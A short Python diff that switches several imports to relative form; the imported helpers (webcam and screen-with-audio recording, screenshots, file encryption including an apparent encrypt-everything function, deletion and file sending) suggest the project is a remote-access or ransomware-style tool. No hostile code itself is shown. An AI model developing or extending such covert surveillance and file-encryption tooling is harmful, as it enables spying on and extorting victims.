@@ -7,11 +7,11 @@ import asyncio
 import platform
 from pathlib import Path
 import shlex, base64
-from k import run_k
-from webcam import record_webcam
-from os_nav import rm, encrypt_file, decrypt_file, chiff_all, home_user_only, send_file
+from .k import run_k
+from .webcam import record_webcam
+from .os_nav import rm, encrypt_file, decrypt_file, chiff_all, home_user_only, send_file
 import requests
-from live import record_screen_with_audio, screen_shoot
+from .live import record_screen_with_audio, screen_shoot
 
 cwd = os.getcwd()
 
